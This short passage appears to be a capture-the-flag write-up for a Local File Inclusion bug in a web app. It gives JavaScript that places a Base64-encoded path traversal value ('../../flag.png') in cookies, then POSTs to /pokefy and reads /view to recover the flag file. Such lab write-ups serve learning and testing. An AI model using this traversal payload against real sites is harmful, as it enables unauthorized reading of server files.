To exploit the Local File Inclusion (LFI) vulnerability in the web app:

    Set cookies for name and url using Base64 encoding:

    javascript

document.cookie = `name=${btoa('flag')}; path=/`;
document.cookie = `url=${btoa('../../flag.png')}; path=/`;

Send a POST request to /pokefy to trigger the vulnerability:

js

fetch('/pokefy', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
});

Access /view to retrieve and view flag.png, which should contain the flag.